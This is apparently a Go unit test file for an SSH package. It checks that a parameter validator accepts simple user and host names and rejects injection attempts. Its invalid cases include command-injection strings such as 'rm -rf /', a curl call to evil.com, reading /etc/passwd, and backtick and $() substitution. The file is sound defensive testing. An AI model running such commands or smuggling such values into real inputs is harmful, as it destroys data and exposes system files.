package ssh

import (
	"strings"
	"testing"
)

func TestValidateSSHParam_ValidInputs(t *testing.T) {
	validParams := []string{
		"user",
		"user_name",
		"user123",
		"host123",
		"host_name",
		"host123",
		"u",
		"user_name_123",
	}

	for _, param := range validParams {
		err := validateSSHParam(param)
		if err != nil {
			t.Errorf("Expected valid param '%s' to pass validation, got error: %v", param, err)
		}
	}
}

func TestValidateSSHParam_InvalidInputs(t *testing.T) {
	invalidParams := []struct {
		param    string
		contains string
	}{
		{"user; rm -rf /", ";"},
		{"user && curl evil.com", "&&"},
		{"user|cat /etc/passwd", "|"},
		{"user`id`", "`"},
		{"user$(whoami)", "$("},
		{"-invalid", "must contain only alphanumeric characters"},
		{"", "must contain only alphanumeric characters"},
		{"a" + strings.Repeat("b", 100), "must contain only alphanumeric characters"},
	}

	for _, test := range invalidParams {
		err := validateSSHParam(test.param)
		if err == nil {
			t.Errorf("Expected invalid param '%s' to fail validation", test.param)
		}

		if !strings.Contains(err.Error(), test.contains) {
			t.Errorf("Expected error to contain '%s' for param '%s', got: %v", test.contains, test.param, err)
		}
	}
}
